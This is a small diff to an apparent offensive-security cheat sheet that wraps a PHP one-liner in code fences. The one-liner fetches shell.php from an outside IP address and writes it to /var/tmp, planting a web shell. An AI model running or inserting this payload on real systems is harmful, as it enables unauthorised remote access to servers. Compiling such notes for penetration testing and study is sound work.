@@ -277,4 +277,6 @@ echo -e "FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /s
 
 ### [php]
 https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#php-1
+```
 <?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
+```
